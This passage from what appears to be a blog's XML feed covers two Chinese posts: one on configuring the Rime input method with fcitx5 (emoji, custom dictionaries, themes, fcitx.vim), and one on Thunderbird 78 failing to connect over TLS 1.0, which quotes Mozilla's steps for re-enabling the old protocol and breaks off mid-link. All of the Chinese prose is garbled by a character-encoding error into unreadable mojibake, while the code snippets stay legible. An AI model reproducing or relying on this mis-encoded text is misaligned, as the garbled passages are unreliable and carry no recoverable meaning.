class="hljs-string">luna_pinyin.extended</span><br>  <span class="hljs-attr">&quot;punctuator/import_preset&quot;:</span> <span class="hljs-string">symbols</span><br>  <span class="hljs-attr">&quot;recognizer/patterns/punct&quot;:</span> <span class="hljs-string">&quot;^/([A-Z|a-z]*|[0-9]|10)$&quot;</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®å®Œæˆåï¼Œè¦é‡æ–°å¯åŠ¨è¾“å…¥æ³•ï¼Œæ¯”å¦‚è¦è¾“å…¥ â˜† ï¼Œè¾“å…¥  <code>/xh</code> å³å¯</p><h2 id="rime-å®‰è£…-Emoji"><a href="#rime-å®‰è£…-Emoji" class="headerlink" title="rime å®‰è£… Emoji"></a>rime å®‰è£… Emoji</h2><p>ğŸ˜„ï¸Emoji è¡¨æƒ…åœ¨ç°åœ¨çš„èŠå¤©ä¸­å·²ç»å¾ˆå¸¸è§äº†ï¼Œrime å¯¹ emoji ä¹Ÿæä¾›äº†æ”¯æŒã€‚å‚è€ƒ <a href="https://github.com/rime/rime-emoji">https://github.com/rime/rime-emoji</a>  å®‰è£… emoji åŒæ ·éœ€è¦ä½¿ç”¨ <a href="https://github.com/rime/plum">æ±é¢¨ç ´</a>ï¼Œæˆ‘å¸¸ç”¨çš„è¾“å…¥æ³•æ˜¯åŒæ‹¼ï¼Œå°† double_pinyin æ›¿æ¢æˆä½ çš„è¾“å…¥æ³•å°±å¯ä»¥äº†ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">rime_frontend=fcitx5-rime bash rime-install emoji<br>rime_frontend=fcitx5-rime bash rime-install emoji:customize:schema=double_pinyin<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒçš„ç è¡¨åœ¨ <a href="https://github.com/rime/rime-emoji/blob/master/opencc/emoji_category.txt">https://github.com/rime/rime-emoji/blob/master/opencc/emoji_category.txt</a> åœ¨è¾“å…¥æ±‰å­—çš„æ—¶å€™ä¼šè‡ªåŠ¨æç¤ºç›¸åº”çš„ emojiã€‚rime-emoji æœ‰æ—¶å€™ä¸èƒ½å¾ˆå‡†ç¡®åœ°è¾“å‡ºæƒ³è¦çš„ emoji ç¬¦å·ï¼Œè¿™æ—¶å€™å¯ä»¥åˆ©ç”¨ emoji_category.txt æŸ¥è¯¢ç›¸å…³åˆ†ç±»ï¼Œä¾‹å¦‚è¾“å…¥ ã€Œé¢œè‰²ã€å°±ä¼šæ˜¾ç¤ºå‡ºå„ç§é¢œè‰²ã€‚</p><h2 id="æ·»åŠ è‡ªå·±è¯åº“çš„æ–¹æ³•"><a href="#æ·»åŠ è‡ªå·±è¯åº“çš„æ–¹æ³•" class="headerlink" title="æ·»åŠ è‡ªå·±è¯åº“çš„æ–¹æ³•"></a>æ·»åŠ è‡ªå·±è¯åº“çš„æ–¹æ³•</h2><p>åœ¨ç”¨æˆ·æ¡£æ¡ˆç›®å½•ï¼Œæ–°å»ºä¸€ä¸ª custom.extended.dict.yaml å†…å®¹å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># custom.extended.dict.yaml</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">custom.extended</span><br><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;2024.4.26&quot;</span><br><span class="hljs-attr">sort:</span> <span class="hljs-string">by_weight</span><br><span class="hljs-attr">use_preset_vocabulary:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">import_tables:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">luna_pinyin</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">luna_pinyin.extended</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">gemoji</span><br><span class="hljs-string">...</span><br><br><span class="hljs-string">æˆ‘çš„æ–°è¯</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è‡ªç”±å¯¼å…¥ä½ æƒ³è¦æ·»åŠ çš„ç è¡¨ï¼Œä¹Ÿå¯ä»¥æ·»åŠ è‡ªå·±çš„è‡ªå®šä¹‰è¯ç»„ã€‚æˆ‘å¯¼å…¥äº† <a href="https://gist.githubusercontent.com/chuangzhu/f60b128fbdae2e30d6edeaf3307489eb/raw/d9b6e250ca035d85190e6b6dd99c4dc1ad4f78c5/gemoji.dict.yaml">github rime Emoji ç è¡¨</a></p><p>æ¥ç€å†äº *.schema.yaml æˆ– *.custom.yaml ä¸­å°† translator&#x2F;dictionary è®¾ç½®æˆæ­¤å­—å…¸æ¡£å³å¯ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">patch</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">translator/dictionary</span><span class="hljs-punctuation">:</span> <span class="hljs-string">custom.extended</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·ä»¥å luna_pinyin.extended å‡çº§åï¼Œä¸ä¼šå¯¹è‡ªå·±æ·»åŠ çš„è¯ç»„é€ æˆå½±å“ï¼Œå¯ä»¥ç›´æ¥å‡çº§è¦†ç›–ã€‚</p><h2 id="å°†ç”¨æˆ·è¯åº“å¯¼å…¥-rime"><a href="#å°†ç”¨æˆ·è¯åº“å¯¼å…¥-rime" class="headerlink" title="å°†ç”¨æˆ·è¯åº“å¯¼å…¥ rime"></a>å°†ç”¨æˆ·è¯åº“å¯¼å…¥ rime</h2><p><code>rime_dict_manager -i luna_pinyin luna_pinyin.userdb.txt</code></p><p>è¿™ä¸€æ­¥å¾ˆå…³é”®å•Šï¼Œå¤šå¹´çš„ç§¯ç´¯ä¸èƒ½æµªè´¹äº†ã€‚</p><h2 id="é…ç½®-fcitx5-çš®è‚¤"><a href="#é…ç½®-fcitx5-çš®è‚¤" class="headerlink" title="é…ç½® fcitx5 çš®è‚¤"></a>é…ç½® fcitx5 çš®è‚¤</h2><p>fcitx5 é»˜è®¤çš„çš®è‚¤ä¸å¤ªå¥½çœ‹ï¼Œæ‰€ä»¥ä¸‹è½½æ›´æ–°äº†çš®è‚¤ï¼Œè¿™æ¬¾ç®€çº¦é£æ ¼çš„çš®è‚¤éå¸¸ç¬¦åˆè€å¤«çš„èƒƒå£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/thep0y/fcitx5-themes.git<br><span class="hljs-built_in">cp</span> spring ~/.local/share/fcitx5/themes -r<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>~/.config/fcitx5/conf/classicui.conf</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># å‚ç›´å€™é€‰åˆ—è¡¨</span><br><span class="hljs-string">Vertical</span> <span class="hljs-string">Candidate</span> <span class="hljs-string">List=False</span><br><br><span class="hljs-comment"># æŒ‰å±å¹• DPI ä½¿ç”¨</span><br><span class="hljs-string">PerScreenDPI=True</span><br><br><span class="hljs-comment"># Font (è®¾ç½®æˆä½ å–œæ¬¢çš„å­—ä½“)</span><br><span class="hljs-string">Font=&quot;Smartisan</span> <span class="hljs-string">Compact</span> <span class="hljs-string">CNS</span> <span class="hljs-number">13</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ä¸»é¢˜(è¿™é‡Œè¦æ”¹æˆä½ æƒ³è¦ä½¿ç”¨çš„ä¸»é¢˜åï¼Œä¸»é¢˜åå°±åœ¨ä¸‹é¢)</span><br><span class="hljs-string">Theme=spring</span><br></code></pre></td></tr></table></figure><p>å¦å¤–è¿˜æœ‰ä¸€æ¬¾ fcitx5 çš®è‚¤ç›¸å¯¹æµè¡Œï¼š<a href="https://github.com/hosxy/Fcitx5-Material-Color">https://github.com/hosxy/Fcitx5-Material-Color</a></p><p>åˆ‡æ¢çš®è‚¤çš„æ–¹æ³•æ˜¯ï¼Œç‚¹å‡»é¼ æ ‡å³é”®ç‚¹å‡» é…ç½® -&gt; é™„åŠ ç»„ä»¶ -&gt; ç»å…¸ç”¨æˆ·ç•Œé¢ -&gt; ç‚¹å‡»å³è¾¹å›¾æ ‡ -&gt; é€‰æ‹©çš®è‚¤</p><h2 id="è®¾ç½®-fcitx-rime-å•è¡Œæ¨¡å¼"><a href="#è®¾ç½®-fcitx-rime-å•è¡Œæ¨¡å¼" class="headerlink" title="è®¾ç½® fcitx rime å•è¡Œæ¨¡å¼"></a>è®¾ç½® fcitx rime å•è¡Œæ¨¡å¼</h2><p>å¦‚æœè¦å°†è¾“å…¥æ³•è®¾ç½®ä¸ºå•è¡Œæ¨¡å¼ï¼Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>~/.config/fcitx5/conf/rime.conf</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PreeditInApplication=True</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…æŒ‰å¿«æ·é”® <code>ctrl + alt + p</code>, è¿™ä¸ªå¿«æ·é”®å¯ä»¥æ¥å›åˆ‡æ¢å¾ˆæ–¹ä¾¿ï¼Œå•è¡Œè¿˜æ˜¯åŒè¡Œå°±å› äººè€Œå¼‚äº†ï¼Œæˆ‘ä¸ªäººè§‰å¾—å•è¡Œå¥½ç‚¹ã€‚</p><h2 id="è®©-fcitx5-æ­£ç¡®æ˜¾ç¤ºèœå•"><a href="#è®©-fcitx5-æ­£ç¡®æ˜¾ç¤ºèœå•" class="headerlink" title="è®© fcitx5 æ­£ç¡®æ˜¾ç¤ºèœå•"></a>è®© fcitx5 æ­£ç¡®æ˜¾ç¤ºèœå•</h2><p>è¦åšè¿™ä¸ªæ­¥éª¤æ˜¯å› ä¸º rime æœ‰ ã€Œéƒ¨ç½²ã€ã€ã€ŒåŒæ­¥ã€è¿™å‡ ä¸ªæ“ä½œæŒ‰é’®ï¼Œå¦‚æœä¸æ­£ç¡®é…ç½®çš„è¯åœ¨ fcitx5 ä¸Šæ²¡æ³•æ­£å¸¸æ˜¾ç¤ºã€‚fcitx5 åœ¨ä»»åŠ¡ä¸Šæœ‰ä¸ªæ‰˜ç›˜å›¾æ ‡ï¼Œç‚¹å‡»å³é”®å°±å¯ä»¥çœ‹åˆ°è¿™äº›èœå•ã€‚</p><p>è¦è®© fcitx æ­£ç¡®æ˜¾ç¤ºèœå•ï¼Œå…³é”®åœ¨äºè®© rime è¾“å…¥æ³•é»˜è®¤å¤„äºæ¿€æ´»çŠ¶æ€ï¼Œæ ¹æ® fcitx5 é…ç½®çš„æç¤ºç¬¬ä¸€ä¸ªè¾“å…¥æ³•ä¸ºéæ¿€æ´»çŠ¶æ€ã€‚</p><ul><li>ï¼ˆ1ï¼‰ å°†ç¬¬ä¸€ä¸ªè¾“å…¥æ³•è®¾ç½®ä¸º  é”®ç›˜-è‹±è¯­ ï¼ˆç¾å›½ï¼‰ï¼Œç¬¬äºŒä¸ªè¾“å…¥æ³•è®¾ç½®ä¸º ä¸­å·éŸµ</li><li>ï¼ˆ2ï¼‰ åœ¨å…¨å±€è®¾ç½®ä¸­ï¼Œå‹¾ä¸Šé»˜è®¤çŠ¶æ€ä¸ºæ¿€æ´»ï¼Œå…±äº«è¾“å…¥çŠ¶æ€è®¾ç½®ä¸º <code>ç¨‹åº</code></li></ul><h2 id="fcitx-vim"><a href="#fcitx-vim" class="headerlink" title="fcitx.vim"></a>fcitx.vim</h2><p>è¿™ä¸ªç« èŠ‚æ˜¯å†™ç»™ linux vim ç”¨æˆ·çœ‹çš„ï¼Œæ²¡æœ‰æ­¤éœ€æ±‚çš„å¯ä»¥ç›´æ¥è·³è¿‡è¿™æ®µã€‚</p><p>vim ç¡®å®æ˜¯ç¨‹åºç¼–è¾‘çš„åˆ©å™¨ï¼Œä½†æ˜¯åœ¨ç”¨vim å†™ä¸­æ–‡æ–‡æ¡£çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªç—›ç‚¹ï¼Œä½ åœ¨ç”¨ fcitx å†™ä¸­æ–‡çš„æ—¶å€™æƒ³ä¿å­˜æ–‡æ¡£ï¼Œvim å¿…é¡»åˆ‡æ¢åˆ° normal æ¨¡å¼æ‰èƒ½è¾“å…¥ä¿å­˜çš„å‘½ä»¤ <code>:w</code>ï¼Œè¿›å…¥normal æ¨¡å¼çš„æ–¹æ³•æ˜¯è¿ç»­æŒ‰ä¸¤ä¸‹ ESCï¼Œå¥½äº†ç°åœ¨ä½ åº”è¯¥è¾“å…¥å‘½ä»¤äº†ï¼Œä½†æ˜¯ä½ æ²¡æ³•è¾“å…¥ä½ ç°åœ¨è¿˜åœ¨æ‰“ä¸­æ–‡å‘¢ï¼Œæ²¡æœ‰åŠæ³•ä½ å¿…é¡»å…ˆåˆ‡æ¢åˆ°è‹±æ–‡è¾“å…¥æ³•ï¼Œç„¶åæ‰èƒ½æ­£ç¡®åœ°è¾“å…¥ <code>:w</code> ç—›è‹¦å•Šã€‚</p><p>fcitx.vim å°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªç—›ç‚¹è€Œç”Ÿçš„æ’ä»¶ï¼Œä¸ªäººè§‰å¾—è¿™æ˜¯vim å¿…è£…çš„å‡ ä¸ªæ’ä»¶ä¹‹ä¸€ã€‚fcitx.vim çš„github ä»“åº“åœ°å€ä¸ºï¼š<a href="https://github.com/lilydjwg/fcitx.vim">https://github.com/lilydjwg/fcitx.vim</a></p><p>å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªä»“åº“æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œfcitx4 åˆ†æ”¯ å’Œ fcitx5 åˆ†æ”¯ï¼Œä½¿ç”¨çš„æ—¶å€™ä¸€å®šè¦åˆ†æ¸…æ¥šï¼Œè¿™ä¸¤ä¸ªåˆ†æ”¯å¦‚æœä½¿ç”¨é”™äº†ï¼Œå°±æ²¡æ³•æ­£å¸¸ä½¿ç”¨ fcitx.vim æ’ä»¶äº†ã€‚fcitx4 å’Œ fcitx5 dbus å¯¹è±¡åå­—æœ‰å˜åŒ–ï¼Œå¯¼è‡´ä»£ç é€šç”¨æ€§ä¸å¥½ã€‚ç°åœ¨é»˜è®¤åˆ†æ”¯ä¸º fcitx5ï¼Œå¦‚æœä½ ä½¿ç”¨ fcitx4 å¯èƒ½ç›´æ¥ git clone ä¸‹æ¥å°±ä¼šå‘ç°æ’ä»¶ç”¨ä¸äº†ï¼Œæˆ‘ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ªåŸå› æ‰å‘ç° fcitx å±…ç„¶æ›´æ–°äº†ã€‚</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å¯èƒ½æœ‰äº›äººä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦æŠ˜è…¾ rimeï¼Œrime çš„ç”¨æˆ·è¯åº“æ–‡ä»¶æ˜¯ä¸ªå®è´ï¼Œè¿™ä¸ªè¯åº“æ˜¯éƒ½æ˜¯ä½ çœŸå®çš„åœ¨æ—¥å¸¸ä½¿ç”¨ä¸­ç”¨åˆ°çš„è¯åº“ï¼Œå°å·§åˆå®ç”¨è¿˜èƒ½åˆ°å¤„åŒæ­¥ï¼Œä¸Šä¼ åˆ°äº‘åæ°¸ä¸ä¸¢å¤±ï¼Œç¬¦åˆè‡ªå·±çš„æ•°æ®è‡ªå·±æŒæ¡çš„ç¡¬é“ç†ã€‚è‡³äºå›½å†…çš„é‚£äº›è¾“å…¥æ³•ï¼Œæˆ‘å°±ä¸åŠ ä»¥è¯„ä»·äº†ï¼Œåœ¨è¿™å•†ä¸šçš„ç¤¾ä¼šè¦ä¿æŒåŸºæœ¬çš„åšäººåº•çº¿ä¸æ˜“ã€‚</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://fcitx-im.org/wiki/Setup_Fcitx_5">https://fcitx-im.org/wiki/Setup_Fcitx_5</a></li><li><a href="https://xuthus.cc/misc/fedora-install-fcitx5.html">https://xuthus.cc/misc/fedora-install-fcitx5.html</a></li><li><a href="https://gist.github.com/ukazap/6495324cf3220b1fef0484e8fdb244ab">https://gist.github.com/ukazap/6495324cf3220b1fef0484e8fdb244ab</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThunerBird 78.8.1 è¿æ¥ TLS 1.0 å¤±è´¥é—®é¢˜å’Œ Linux ä¹±è°ˆ</title>
    <link href="/cn/thunderbird.tls.1.0/"/>
    <url>/cn/thunderbird.tls.1.0/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘åœ¨å…¬å¸ä½¿ç”¨ Linux ä½œç”¨ä¸»åŠ›æœºå·²ç» 10 å¤šå¹´äº†ï¼Œè‡ªä»æŠ›å¼ƒ Ubuntu è½¬å…¥ Fedora æ€€æŠ±ï¼Œç”Ÿæ´»å¹¸ç¦äº†ä¸å°‘ã€‚<br>æ—©å¹´æœ€å¤§çš„é—®é¢˜æ˜¯ OFFICE è½¯ä»¶ï¼Œå·¥ä½œä¸­å°‘ä¸äº†è¦å’Œ docã€pptï¼Œxls æ‰“äº¤é“ï¼Œåˆæ²¡æœ‰å¤ªå¥½çš„è½¯ä»¶å¯ä»¥ä½¿ç”¨ã€‚<br>åˆšå¼€å§‹åŸºæœ¬å°±ä¸¤ä¸ªè§£å†³æ–¹æ¡ˆï¼Œwine office å’Œæ°¸ä¸­ OFFICEï¼Œè¿™ä¸¤ä¸ªæ–¹æ¡ˆéƒ½ä¸æ˜¯å¤ªç†æƒ³ï¼Œwine çš„é€Ÿåº¦å¾ˆæ…¢ï¼Œ<br>æ°¸ä¸­åˆ™å…¼å®¹æ€§æ¯”è¾ƒå·®ï¼Œè¿˜ä¼šå‡ºç°æ–‡æ¡£æ ¼å¼çœ‹èµ·æ¥å°±æœ‰æ˜æ˜¾å·®å¼‚çš„æƒ…å†µã€‚ã€‚</p><p>éšç€é‡‘å±± wps çš„å‘å±•ï¼Œç°åœ¨ OFFICE çš„é—®é¢˜åŸºæœ¬è§£å†³ï¼Œä½œä¸ºè½»åº¦ EXCEL ä½¿ç”¨è€…åŸºæœ¬å·²ç»æ»¡è¶³éœ€æ±‚äº†ã€‚Linux<br>ç°åœ¨ä¸»è¦é—®é¢˜æ˜¯å­—ä½“æ¸²æŸ“æ¯”è¾ƒå·®ï¼Œä¸­æ–‡ç»å¸¸çœ‹èµ·æ¥å‘è™šï¼Œå¦‚æœèƒ½æŠŠè¿™ä¸ªé—®é¢˜å½»åº•è§£å†³å°±éå¸¸ä¸é”™äº†ã€‚ä½œä¸ºLinux<br>è€ç”¨æˆ·ï¼Œå„ç§é­”æ”¹åï¼Œä¹Ÿèƒ½è¾ƒå¥½ä½¿ç”¨äº†ï¼Œä½†åé¢å‘ç°è¿˜æ˜¯æ¢ä¸ªæ˜¾ç¤ºå™¨æ›´ç®¡ç”¨ã€‚è¦è§£å†³ä¸­æ–‡æ˜¾ç¤ºé—®é¢˜ï¼Œæœ‰ä¸¤ä¸ª<br>å­—ä½“å¾ˆç®¡ç”¨ï¼Œæ–‡æ³‰é©¿å¾®ç±³é»’å’Œå¾®è½¯é›…é»‘ï¼Œå®è·µè¯æ˜æŠŠç³»ç»Ÿå­—ä½“ç”¨ä¸Šé¢ä¸¤ä¸ªå­—ä½“æ›¿æ¢ï¼Œæ˜¾ç¤ºæ•ˆæœä¹Ÿå°±å¥½äº†ä¸å°‘äº†ã€‚</p><p>Ubuntu Linux æœ€å¤§çš„é—®é¢˜å°±æ˜¯ä¸å¤ªç¨³å®šï¼ŒåŸºæœ¬æ¯æ¬¡å¤§ç‰ˆæœ¬å‡çº§æ˜¾ç¤ºéƒ½è¦æŒ‚ï¼Œå¼„å¾—æˆ‘éƒ½æœ‰ç‚¹å¿ƒç†é˜´å½±äº†ï¼ŒåŸæ¥<br>å‘¨å›´è¿˜æŒºå¤šåŒå­¦ä½¿ç”¨ Linuxï¼Œæœ€ç»ˆæ”¾å¼ƒäº†ï¼Œä¸€ä¸ªç›´æ¥ç”¨ Windows äº†ï¼Œè¿˜æœ‰ä¸€ä¸ª Windows ä¸Šè·‘ä¸€ä¸ª Linux è™šæ‹Ÿæœºã€‚<br>Ubuntu è¿˜æœ‰ä¸ªåä¹ æƒ¯å–œæ¬¢ä¹±æ”¹ï¼Œupstartï¼ŒUnityç­‰ï¼Œåé¢éƒ½æ²¡æœ‰æˆä¸ºä¸»æµï¼Œbug å°±æ›´ä¸ç”¨è¯´äº†ï¼Œç»å¸¸æŒºé—¹å¿ƒçš„ã€‚</p><p>Fedora ä»è¿‘äº›å¹´çš„ä½¿ç”¨æƒ…å†µæ¥çœ‹ï¼Œè¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œç½‘ç»œä¸­æµä¼ æ˜¯ Redhat Linux Enterprise çš„å°ç™½ç‰ˆæœ¬ï¼Œ<br>ä½†æ˜¯å…¶å®åªè¦ bug ä¿®å¾—å¿«ï¼Œä½ å¤§æ¦‚ç‡æ˜¯æ„Ÿè§‰ä¸åˆ°çš„ã€‚é‡ä¸Šé—®é¢˜ï¼Œæ”¾ç‹—ä¸€æœå°±ä¼šå‘ç° redhat å·²ç»æœ‰ bug åœ¨<br>å¤„ç†ä¸­äº†ï¼Œäºæ˜¯ä¹å°±æœ‰äº†ä»Šå¤©è¿™ç¯‡ã€‚</p><p>åœ¨å‡çº§åˆ° Fedara 33 å’Œ ThunderBird 78 åï¼Œä½¿ç”¨ TLS è¿æ¥å…¬å¸çš„ ExChange é‚®ä»¶æœåŠ¡å™¨å°±è¿ä¸ä¸Šäº†ã€‚<br>æˆ‘ä»¬å…¬å¸çš„å†…ç½‘å®‰å…¨å®¡æ ¸éå¸¸ä¸¥æ ¼ï¼Œé‚®ä»¶ä¸ä½¿ç”¨åŠ å¯†è¿æ¥è¦é™æ—¶æ•´æ”¹ã€‚æ”¾ç‹—ä¸€æœå‘ç°ï¼Œå¤§æ‰¹äººå‘˜éƒ½é‡ä¸Šäº†<br>ç›¸åŒçš„é—®é¢˜ï¼Œä¹Ÿæœ‰äººç»™å‡ºäº†è§£å†³æ–¹æ¡ˆã€‚</p><p><a href="https://support.mozilla.org/en-US/questions/1295861">https://support.mozilla.org/en-US/questions/1295861</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">I think this could be due <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> minimum <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> TLS supported <span class="hljs-keyword">by</span> TB <span class="hljs-number">78.</span> The release notes state <br>that versions <span class="hljs-built_in">lower</span> than <span class="hljs-number">1.2</span> are disabled, so <span class="hljs-keyword">if</span> your server only supports v. <span class="hljs-number">1.1</span>, <br>you might be able <span class="hljs-built_in">to</span> fix sending <span class="hljs-keyword">by</span> changing <span class="hljs-keyword">the</span> preference security.tls.<span class="hljs-built_in">version</span>.<span class="hljs-built_in">min</span> <span class="hljs-built_in">to</span> <span class="hljs-number">2</span> <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> default <span class="hljs-number">3</span>, <span class="hljs-keyword">in</span> Config. editor.<br><br></code></pre></td></tr></table></figure><p><a href="https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/">https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">TLS</span> <span class="hljs-number">1</span>.<span class="hljs-number">0</span> and <span class="hljs-number">1</span>.<span class="hljs-number">1</span> disabled<br></code></pre></td></tr></table></figure><p>å¦‚ä½•å¼€å¯ TLS 1.0ï¼Œ mozilla ä¹Ÿç»™å‡ºäº†ç›¸åº”çš„æ–¹æ¡ˆ</p><p><a href="https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1">https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim">How <span class="hljs-keyword">to</span> enable outdated security protocols TLS <span class="hljs-number">1.0</span> <span class="hljs-built_in">and</span> <span class="hljs-number">1.1</span><br><br>Open Config Editor (abou<span class="hljs-variable">t:config</span>)<br>â‰¡ &gt; Preferences &gt; Find in Preferences<br>In the searchbox, <span class="hljs-built_in">type</span>: abou<span class="hljs-variable">t:config</span>, then press Enter.<br>Click <span class="hljs-keyword">on</span> the button Config Editorâ€¦ in the <span class="hljs-built_in">search</span> result.<br>In the abou<span class="hljs-variable">t:config</span> dialog, <span class="hljs-built_in">search</span> <span class="hljs-keyword">for</span>: security.tls.<span class="hljs-keyword">version</span>.<span class="hljs-built_in">min</span><br>Double-click <span class="hljs-keyword">on</span> the found preference security.tls.<span class="hljs-keyword">version</span>.<span class="hljs-built_in">min</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">change</span> its value <span class="hljs-keyword">to</span> <span class="hljs-number">1</span>, then press Enter.<br>Restart Thunderbird <span class="hljs-built_in">and</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> download your <span class="hljs-keyword">messages</span>.<br>If you can receive <span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span> send your <span class="hljs-keyword">messages</span> after changing this preference:<br><br>Please inform your email provider <span class="hljs-keyword">to</span> upgrade the security protocols <span class="hljs-keyword">on</span> the server <span class="hljs-keyword">to</span> support TLS <span class="hljs-number">1.2</span>.<br>Revert the preference security.tls.<span class="hljs-keyword">version</span>.<span class="hljs-built_in">min</span> <span class="hljs-keyword">to</span> its original value <span class="hljs-keyword">as</span> soon <span class="hljs-keyword">as</span> possible by repeating <br>the above procedure, then <span class="hljs-keyword">right</span>-click <span class="hljs-keyword">on</span> the preference <span class="hljs-built_in">and</span> choose Reset from the context <span class="hljs-keyword">menu</span>.<br><br></code></pre></td></tr></table></figure><p>çœ‹ä¸Šå»è§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼Œåœ¨ Preferences ä¸­çš„æœç´¢æ¡†é‡Œè¾“å…¥ <code>about:config</code> ç‚¹å‡»è¿›å…¥ï¼Œå°†å…¶ä¸­çš„<br><code>security.tls.version.min</code> è®¾ç½®ä¸º 1 å°±å¥½äº†ï¼Œä½†æ˜¯åœ¨ Fedora 34 ä¸­ä¸èµ·ä½œç”¨ã€‚æˆ‘ç”¨ wireshark æŠ“äº†åŒ…çœ‹ï¼Œ<br>ThunderBird è‡ªå·±æŠ¥å‘Šä¸æ”¯æŒçš„åè®®ç‰ˆæœ¬ã€‚æˆ‘ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ ThunderBird ç›¸å…³çš„ config é¡¹æœ‰ä¸‹é¢å‡ ä¸ªï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">security</span>.tls.<span class="hljs-keyword">version</span>.min<br><span class="hljs-keyword">security</span>.tls.<span class="hljs-keyword">version</span>.<span class="hljs-keyword">enable</span>-deprecated<br><span class="hljs-keyword">security</span>.tls.<span class="hljs-keyword">version</span>.fallback-<span class="hljs-keyword">limit</span><br></code></pre></td></tr></table></figure><p>æˆ‘æŠŠè¿™å‡ ä¸ªé€‰é¡¹éƒ½è®¾ç½®äº†ä¸€ä¸‹ï¼Œåˆ†åˆ«è®¾ç½®ä¸º 1 true 1ï¼Œè¿˜æ˜¯ä¸ç®¡ç”¨ã€‚</p><p>åœ¨ Fedora 33 ä¸Šè¿™ä¸ªé—®é¢˜å°±æ²¡è§£å†³ï¼Œè¿™éƒ½ Fedora 34 äº†ï¼Œæ‰€ä»¥åˆèŠ±äº†æ—¶é—´ç ”ç©¶äº†ä¸€ä¸‹ã€‚æ²¡å¥½åŠæ³•ï¼Œæ”¾ç‹—ï¼Œè¿æ°”<br>ä¸é”™ï¼Œçœ‹åˆ°äº†è¿™ç¯‡</p><p><a 